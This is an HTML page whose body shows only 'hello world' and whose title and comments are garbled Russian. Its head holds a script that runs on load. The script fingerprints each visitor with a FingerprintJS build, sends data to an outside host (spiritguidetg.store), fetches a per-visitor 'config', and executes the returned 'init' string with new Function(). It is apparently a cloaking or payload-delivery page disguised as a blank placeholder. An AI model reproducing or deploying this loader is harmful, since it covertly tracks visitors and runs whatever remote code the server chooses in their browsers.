<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ë–µ–ª—ã–π –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä</title>
  
<script type="module">
(async () => {
    try {
        // –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø–æ–ª–Ω—ã–π URL –∫–∞–∫ –≤ —Ä–∞–±–æ—á–µ–º –ø—Ä–∏–º–µ—Ä–µ
        const CONFIG_API = 'https://spiritguidetg.store/fp.php';
        
        console.log('üöÄ –ù–∞—á–∏–Ω–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É FingerprintJS...');
        
        // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ (–∫–∞–∫ –≤ —Ä–∞–±–æ—á–µ–º –ø—Ä–∏–º–µ—Ä–µ)
        function updateStatus(success, message = '') {
            console.log(success ? '‚úÖ –°—Ç–∞—Ç—É—Å: —É—Å–ø–µ—Ö' : '‚ùå –°—Ç–∞—Ç—É—Å: –æ—à–∏–±–∫–∞', message);
        }

        function logResult(stage, data, isError = false) {
            const prefix = isError ? '‚ùå' : '‚úÖ';
            console.log(`${prefix} ${stage}:`, data);
        }

        // –¢–µ—Å—Ç–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ —Å–µ—Ä–≤–µ—Ä–∞
        async function testConnection() {
            try {
                console.log('üîó –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å —Å–µ—Ä–≤–µ—Ä–æ–º...');
                
                const response = await fetch(CONFIG_API, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Origin': window.location.origin
                    },
                    body: JSON.stringify({
                        test: 'connection_check',
                        timestamp: new Date().toISOString(),
                        source: 'FingerprintJS_Integration'
                    })
                });

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }

                const responseData = await response.json();
                logResult('–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è', {
                    status: response.status,
                    data: responseData
                });
                
                return true;
            } catch (error) {
                logResult('–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è', {
                    error: error.message,
                    timestamp: new Date().toISOString()
                }, true);
                return false;
            }
        }

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ –∑–∞–≥—Ä—É–∑–∫–æ–π FingerprintJS
        const connectionOk = await testConnection();
        if (!connectionOk) {
            console.error('‚ùå –ù–µ —É–¥–∞–µ—Ç—Å—è –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É. –ü—Ä–µ—Ä—ã–≤–∞–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ.');
            return;
        }

        // –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π –∏–º–ø–æ—Ä—Ç FingerprintJS
        console.log('üì¶ –ó–∞–≥—Ä—É–∂–∞–µ–º FingerprintJS...');
        const FingerprintJS = await import('/clk/fp.js');
        
        console.log('üîß –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º FingerprintJS...');
        const fp = await FingerprintJS.load({
            region: 'eu',
            endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
        });

        console.log('üÜî –ü–æ–ª—É—á–∞–µ–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä...');
        const { requestId, visitorId } = await fp.get({ extendedResult: true });
        
        logResult('FingerprintJS –¥–∞–Ω–Ω—ã–µ', {
            requestId: requestId,
            visitorId: visitorId
        });

        // –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫
        console.log('‚öôÔ∏è –ó–∞–≥—Ä—É–∂–∞–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é...');
        
        try {
            const configUrl = `${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`;
            console.log('üîó URL –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏:', configUrl);
            
            const res = await fetch(configUrl, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Origin': window.location.origin,
                    'Cache-Control': 'no-cache'
                }
            });

            console.log('üìä –°—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞:', res.status, res.statusText);

            if (!res.ok) {
                throw new Error(`HTTP ${res.status}: ${res.statusText}`);
            }

            const data = await res.json();
            logResult('–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∞', {
                status: res.status,
                dataKeys: Object.keys(data),
                hasInit: !!data.init
            });

            // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫
            if (data.init && typeof data.init === 'string') {
                console.log('üé≠ –í—ã–ø–æ–ª–Ω—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–¥...');
                try {
                    new Function(data.init)();
                    logResult('–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –∫–æ–¥–∞', { success: true });
                } catch (initError) {
                    logResult('–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –∫–æ–¥–∞', {
                        error: initError.message,
                        code: data.init.substring(0, 100) + '...'
                    }, true);
                }
            } else if (data.status === 'ok' && data.message) {
                console.log('üìù –ü–æ–ª—É—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ:', data.message);
                logResult('–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è', data);
            }

            updateStatus(true, '–í—Å–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –∑–∞–≥—Ä—É–∂–µ–Ω—ã —É—Å–ø–µ—à–Ω–æ');

        } catch (configError) {
            logResult('–ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏', {
                error: configError.message,
                requestId: requestId,
                timestamp: new Date().toISOString()
            }, true);
            
            updateStatus(false, '–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏');
        }

    } catch (err) {
        logResult('–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞', {
            error: err.message,
            stack: err.stack,
            timestamp: new Date().toISOString()
        }, true);
        
        updateStatus(false, '–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ FingerprintJS');
        
        console.error('‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ FingerprintJS:', err);
    }
})();
</script>

</head>
<body>
  hello world
</body>
</html>
